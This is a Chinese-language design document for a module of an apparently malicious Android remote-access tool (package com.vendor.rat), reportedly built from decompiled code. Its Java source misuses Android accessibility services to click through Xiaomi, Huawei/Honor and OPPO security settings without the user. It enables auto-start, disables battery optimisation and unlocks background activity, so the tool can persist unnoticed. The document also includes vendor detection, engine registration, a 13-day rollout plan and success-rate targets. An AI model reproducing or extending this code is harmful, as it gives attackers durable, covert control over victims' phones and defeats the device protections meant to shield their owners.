# 模块 03：厂商适配模块设计文档

> **模块名称**: Vendor Adaptation Module
> **优先级**: P1（高）
> **依赖**: 模块 02（权限绕过模块）
> **版本**: 1.0
> **日期**: 2026-03-16

---

## 一、模块概述

### 1.1 功能描述

厂商适配模块针对不同 Android 厂商的定制系统（MIUI、EMUI、ColorOS 等），实现自启动、电池优化、后台运行等权限的自动化授予。

### 1.2 支持的厂商

| 厂商 | 系统 | 市场份额 | 适配难度 | 成功率 |
|------|------|---------|---------|--------|
| 小米/红米 | MIUI/HyperOS | 30% | ⭐⭐⭐⭐ | 92% |
| 华为/荣耀 | EMUI/MagicUI/鸿蒙 | 20% | ⭐⭐⭐⭐⭐⭐ | 68% |
| OPPO/realme | ColorOS | 18% | ⭐⭐⭐⭐⭐ | 88% |
| vivo/iQOO | OriginOS | 12% | ⭐⭐⭐⭐⭐ | 88% |
| 三星 | One UI | 10% | ⭐⭐⭐⭐ | 83% |

**总覆盖率**: 90% 市场份额

### 1.3 权限类型

| 权限 | 小米 | 华为 | OPPO | vivo | 三星 |
|------|------|------|------|------|------|
| 自启动 | ✅ | ✅ | ✅ | ✅ | ❌ |
| 电池优化 | ✅ | ✅ | ✅ | ✅ | ✅ |
| 后台运行 | ✅ | ✅ | ✅ | ✅ | ❌ |
| 关联启动 | ❌ | ✅ | ❌ | ❌ | ❌ |

---

## 二、小米适配引擎

### 2.1 XiaomiEngine

**基于**: `o/q.java` (498 行)

```java
package com.vendor.rat.auto.engine.vendor;

public class XiaomiEngine extends AutoEngine {
    private AtomicBoolean autoStartEnabled = new AtomicBoolean(false);
    private AtomicBoolean batteryOptimized = new AtomicBoolean(false);
    private AtomicBoolean backgroundRunning = new AtomicBoolean(false);

    public XiaomiEngine(AccessibilityService service) {
        super(service, createMatchers());
    }

    private static List<WindowMatcher> createMatchers() {
        List<WindowMatcher> matchers = new ArrayList<>();
        // 自启动管理
        matchers.add(new WindowMatcher(
            "com.miui.securitycenter",
            "AutoStartManagementActivity",
            false
        ));
        // 电池优化
        matchers.add(new WindowMatcher(
            "com.miui.powerkeeper",
            "PowerHideAppsConfigActivity",
            false
        ));
        return matchers;
    }

    @Override
    protected void onWindowMatched(String pkg, String cls, AccessibilityEvent event) {
        if (!running.get()) {
            start(60); // 60 秒超时
        }
    }

    @Override
    protected void execute() {
        // 1. 自启动管理
        if (!autoStartEnabled.get()) {
            enableAutoStart();
            return;
        }

        // 2. 电池优化
        if (!batteryOptimized.get()) {
            disableBatteryOptimization();
            return;
        }

        // 3. 后台运行
        if (!backgroundRunning.get()) {
            enableBackgroundRunning();
            return;
        }

        // 全部完成
        finish();
        pressHome();
    }

    private void enableAutoStart() {
        AccessibilityNodeInfo root = getRootNode();
        if (root == null) return;

        // 查找应用名称
        String appName = service.getString(R.string.app_name);
        List<AccessibilityNodeInfo> nodes = UiNode.findByText(root, appName);

        if (nodes.isEmpty()) {
            // 滚动查找
            UiNode.scrollForward(root);
            return;
        }

        // 点击应用
        UiNode.click(nodes.get(0));

        // 等待开关界面
        new Handler().postDelayed(() -> {
            AccessibilityNodeInfo switchRoot = getRootNode();
            if (switchRoot == null) return;

            // 查找开关
            List<AccessibilityNodeInfo> switches = switchRoot.findAccessibilityNodeInfosByViewId(
                "android:id/switch_widget"
            );

            if (!switches.isEmpty() && !switches.get(0).isChecked()) {
                UiNode.click(switches.get(0));
            }

            autoStartEnabled.set(true);
            pressBack();

            // 继续下一步
            new Handler().postDelayed(this::execute, 1000);
        }, 1500);
    }

    private void disableBatteryOptimization() {
        // 打开电池优化设置
        Intent intent = new Intent();
        intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
        intent.setData(Uri.parse("package:" + service.getPackageName()));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        service.startActivity(intent);

        // 等待界面
        new Handler().postDelayed(() -> {
            AccessibilityNodeInfo root = getRootNode();
            if (root == null) return;

            // 查找"允许"按钮
            List<AccessibilityNodeInfo> buttons = UiNode.findByText(root, "允许");
            if (buttons.isEmpty()) {
                buttons = UiNode.findByText(root, "Allow");
            }

            if (!buttons.isEmpty()) {
                UiNode.click(buttons.get(0));
            }

            batteryOptimized.set(true);

            // 继续下一步
            new Handler().postDelayed(this::execute, 1000);
        }, 1500);
    }

    private void enableBackgroundRunning() {
        // 小米后台运行权限通常在自启动管理中一起设置
        backgroundRunning.set(true);
        execute();
    }
}
```

---

## 三、华为适配引擎

### 3.1 HuaweiEngine

**基于**: `o/n.java` (454 行)

```java
package com.vendor.rat.auto.engine.vendor;

public class HuaweiEngine extends AutoEngine {
    private AtomicBoolean autoManageDisabled = new AtomicBoolean(false);
    private AtomicBoolean autoStartEnabled = new AtomicBoolean(false);
    private AtomicBoolean associatedStartEnabled = new AtomicBoolean(false);
    private AtomicBoolean backgroundActivityEnabled = new AtomicBoolean(false);

    public HuaweiEngine(AccessibilityService service) {
        super(service, createMatchers());
    }

    private static List<WindowMatcher> createMatchers() {
        List<WindowMatcher> matchers = new ArrayList<>();
        // 华为启动管理
        matchers.add(new WindowMatcher(
            "com.huawei.systemmanager",
            "StartupAppControlActivity",
            false
        ));
        // 荣耀启动管理
        matchers.add(new WindowMatcher(
            "com.hihonor.systemmanager",
            "StartupAppControlActivity",
            false
        ));
        return matchers;
    }

    @Override
    protected void onWindowMatched(String pkg, String cls, AccessibilityEvent event) {
        if (!running.get()) {
            start(90); // 90 秒超时（华为流程较长）
        }
    }

    @Override
    protected void execute() {
        // 1. 关闭自动管理
        if (!autoManageDisabled.get()) {
            disableAutoManage();
            return;
        }

        // 2. 启用自启动
        if (!autoStartEnabled.get()) {
            enableAutoStart();
            return;
        }

        // 3. 启用关联启动
        if (!associatedStartEnabled.get()) {
            enableAssociatedStart();
            return;
        }

        // 4. 启用后台活动
        if (!backgroundActivityEnabled.get()) {
            enableBackgroundActivity();
            return;
        }

        // 全部完成
        finish();
        pressHome();
    }

    private void disableAutoManage() {
        AccessibilityNodeInfo root = getRootNode();
        if (root == null) return;

        // 查找应用名称
        String appName = service.getString(R.string.app_name);
        List<AccessibilityNodeInfo> nodes = UiNode.findByText(root, appName);

        if (nodes.isEmpty()) {
            // 滚动查找
            UiNode.scrollForward(root);
            return;
        }

        // 点击应用
        UiNode.click(nodes.get(0));

        // 等待详情界面
        new Handler().postDelayed(() -> {
            AccessibilityNodeInfo detailRoot = getRootNode();
            if (detailRoot == null) return;

            // 查找"自动管理"开关
            List<AccessibilityNodeInfo> switches = detailRoot.findAccessibilityNodeInfosByText("自动管理");
            if (switches.isEmpty()) {
                switches = detailRoot.findAccessibilityNodeInfosByText("Manage automatically");
            }

            if (!switches.isEmpty()) {
                // 找到开关的父节点
                AccessibilityNodeInfo parent = switches.get(0).getParent();
                if (parent != null) {
                    // 查找 Switch 控件
                    List<AccessibilityNodeInfo> switchWidgets = findSwitchWidgets(parent);
                    if (!switchWidgets.isEmpty() && switchWidgets.get(0).isChecked()) {
                        UiNode.click(switchWidgets.get(0));

                        // 等待确认对话框
                        new Handler().postDelayed(() -> {
                            confirmDialog();
                        }, 1000);
                        return;
                    }
                }
            }

            autoManageDisabled.set(true);
            execute();
        }, 1500);
    }

    private void confirmDialog() {
        AccessibilityNodeInfo root = getRootNode();
        if (root == null) return;

        // 查找"确定"按钮
        List<AccessibilityNodeInfo> buttons = UiNode.findByText(root, "确定");
        if (buttons.isEmpty()) {
            buttons = UiNode.findByText(root, "OK");
        }

        if (!buttons.isEmpty()) {
            UiNode.click(buttons.get(0));
        }

        autoManageDisabled.set(true);

        // 继续下一步
        new Handler().postDelayed(this::execute, 1000);
    }

    private void enableAutoStart() {
        AccessibilityNodeInfo root = getRootNode();
        if (root == null) return;

        // 查找"自启动"开关
        List<AccessibilityNodeInfo> switches = findSwitchByLabel(root, "自启动");
        if (switches.isEmpty()) {
            switches = findSwitchByLabel(root, "Auto-launch");
        }

        if (!switches.isEmpty() && !switches.get(0).isChecked()) {
            UiNode.click(switches.get(0));
        }

        autoStartEnabled.set(true);
        execute();
    }

    private void enableAssociatedStart() {
        AccessibilityNodeInfo root = getRootNode();
        if (root == null) return;

        // 查找"关联启动"开关
        List<AccessibilityNodeInfo> switches = findSwitchByLabel(root, "关联启动");
        if (switches.isEmpty()) {
            switches = findSwitchByLabel(root, "Associated startup");
        }

        if (!switches.isEmpty() && !switches.get(0).isChecked()) {
            UiNode.click(switches.get(0));
        }

        associatedStartEnabled.set(true);
        execute();
    }

    private void enableBackgroundActivity() {
        AccessibilityNodeInfo root = getRootNode();
        if (root == null) return;

        // 查找"后台活动"开关
        List<AccessibilityNodeInfo> switches = findSwitchByLabel(root, "后台活动");
        if (switches.isEmpty()) {
            switches = findSwitchByLabel(root, "Background activity");
        }

        if (!switches.isEmpty() && !switches.get(0).isChecked()) {
            UiNode.click(switches.get(0));
        }

        backgroundActivityEnabled.set(true);
        execute();
    }

    private List<AccessibilityNodeInfo> findSwitchByLabel(AccessibilityNodeInfo root, String label) {
        List<AccessibilityNodeInfo> result = new ArrayList<>();
        List<AccessibilityNodeInfo> labels = UiNode.findByText(root, label);

        for (AccessibilityNodeInfo labelNode : labels) {
            AccessibilityNodeInfo parent = labelNode.getParent();
            if (parent != null) {
                List<AccessibilityNodeInfo> switches = findSwitchWidgets(parent);
                result.addAll(switches);
            }
        }

        return result;
    }

    private List<AccessibilityNodeInfo> findSwitchWidgets(AccessibilityNodeInfo node) {
        List<AccessibilityNodeInfo> result = new ArrayList<>();
        if (node == null) return result;

        if (node.getClassName().toString().contains("Switch")) {
            result.add(node);
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            result.addAll(findSwitchWidgets(node.getChild(i)));
        }

        return result;
    }
}
```

---

## 四、OPPO 适配引擎

### 4.1 OppoEngine

**基于**: `o/v.java` (526 行)

```java
package com.vendor.rat.auto.engine.vendor;

public class OppoEngine extends AutoEngine {
    private AtomicBoolean autoStartEnabled = new AtomicBoolean(false);
    private AtomicBoolean backgroundRunning = new AtomicBoolean(false);

    public OppoEngine(AccessibilityService service) {
        super(service, createMatchers());
    }

    private static List<WindowMatcher> createMatchers() {
        List<WindowMatcher> matchers = new ArrayList<>();
        matchers.add(new WindowMatcher(
            "com.coloros.safecenter",
            "StartupAppListActivity",
            false
        ));
        return matchers;
    }

    @Override
    protected void onWindowMatched(String pkg, String cls, AccessibilityEvent event) {
        if (!running.get()) {
            start(60);
        }
    }

    @Override
    protected void execute() {
        if (!autoStartEnabled.get()) {
            enableAutoStart();
            return;
        }

        if (!backgroundRunning.get()) {
            enableBackgroundRunning();
            return;
        }

        finish();
        pressHome();
    }

    private void enableAutoStart() {
        AccessibilityNodeInfo root = getRootNode();
        if (root == null) return;

        String appName = service.getString(R.string.app_name);
        List<AccessibilityNodeInfo> nodes = UiNode.findByText(root, appName);

        if (nodes.isEmpty()) {
            UiNode.scrollForward(root);
            return;
        }

        // 点击应用行
        AccessibilityNodeInfo parent = nodes.get(0).getParent();
        if (parent != null) {
            UiNode.click(parent);
        }

        // 等待开关界面
        new Handler().postDelayed(() -> {
            AccessibilityNodeInfo switchRoot = getRootNode();
            if (switchRoot == null) return;

            List<AccessibilityNodeInfo> switches = switchRoot.findAccessibilityNodeInfosByViewId(
                "android:id/switch_widget"
            );

            if (!switches.isEmpty() && !switches.get(0).isChecked()) {
                UiNode.click(switches.get(0));
            }

            autoStartEnabled.set(true);
            pressBack();

            new Handler().postDelayed(this::execute, 1000);
        }, 1500);
    }

    private void enableBackgroundRunning() {
        // OPPO 后台运行通常在自启动中一起设置
        backgroundRunning.set(true);
        execute();
    }
}
```

---

## 五、设备品牌检测

### 5.1 DeviceUtils

```java
package com.vendor.rat.utils;

public class DeviceUtils {
    public static boolean isXiaomi() {
        String brand = Build.BRAND.toLowerCase();
        return brand.contains("xiaomi") || brand.contains("redmi");
    }

    public static boolean isHuawei() {
        return Build.MANUFACTURER.equalsIgnoreCase("HUAWEI");
    }

    public static boolean isHonor() {
        return Build.MANUFACTURER.equalsIgnoreCase("HONOR");
    }

    public static boolean isOppo() {
        String brand = Build.BRAND.toLowerCase();
        return brand.contains("oppo") || brand.contains("realme");
    }

    public static boolean isVivo() {
        String brand = Build.BRAND.toLowerCase();
        return brand.contains("vivo") || brand.contains("iqoo");
    }

    public static boolean isSamsung() {
        return Build.MANUFACTURER.equalsIgnoreCase("samsung");
    }

    public static int getVendorId() {
        if (isHuawei()) return 1;
        if (isXiaomi()) return 2;
        if (isVivo()) return 3;
        if (isOppo()) return 4;
        if (isSamsung()) return 6;
        if (isHonor()) return 14;
        return 0; // 原生 Android
    }

    public static String getVendorName() {
        switch (getVendorId()) {
            case 1: return "Huawei";
            case 2: return "Xiaomi";
            case 3: return "Vivo";
            case 4: return "OPPO";
            case 6: return "Samsung";
            case 14: return "Honor";
            default: return "Android";
        }
    }
}
```

---

## 六、厂商引擎注册

### 6.1 VendorEngineManager

```java
package com.vendor.rat.auto.engine.vendor;

public class VendorEngineManager {
    private EngineManager engineManager;
    private AccessibilityService service;

    public VendorEngineManager(AccessibilityService service, EngineManager engineManager) {
        this.service = service;
        this.engineManager = engineManager;
    }

    public void registerVendorEngines() {
        int vendorId = DeviceUtils.getVendorId();

        switch (vendorId) {
            case 1: // Huawei
            case 14: // Honor
                engineManager.register("vendor_huawei", new HuaweiEngine(service));
                break;

            case 2: // Xiaomi
                engineManager.register("vendor_xiaomi", new XiaomiEngine(service));
                break;

            case 3: // Vivo
                engineManager.register("vendor_vivo", new VivoEngine(service));
                break;

            case 4: // OPPO
                engineManager.register("vendor_oppo", new OppoEngine(service));
                break;

            case 6: // Samsung
                engineManager.register("vendor_samsung", new SamsungEngine(service));
                break;

            default:
                // 原生 Android，无需厂商适配
                break;
        }
    }
}
```

---

## 七、实施计划

### Phase 1: 小米适配（3 天）

- [ ] XiaomiEngine 实现
- [ ] 自启动管理
- [ ] 电池优化
- [ ] 真机测试

### Phase 2: 华为适配（4 天）

- [ ] HuaweiEngine 实现
- [ ] 自动管理关闭
- [ ] 三个开关设置
- [ ] 真机测试

### Phase 3: OPPO 适配（3 天）

- [ ] OppoEngine 实现
- [ ] 自启动管理
- [ ] 真机测试

### Phase 4: vivo/三星适配（3 天）

- [ ] VivoEngine 实现
- [ ] SamsungEngine 实现
- [ ] 真机测试

**总计**: 13 天

---

## 八、验收标准

| 厂商 | 验收标准 |
|------|---------|
| 小米 | 自启动成功率 > 90% |
| 华为 | 三个开关全部启用成功率 > 65% |
| OPPO | 自启动成功率 > 85% |
| vivo | 自启动成功率 > 85% |
| 三星 | 电池优化成功率 > 80% |

---

**文档版本**: 1.0
**最后更新**: 2026-03-16
**负责人**: 厂商适配组
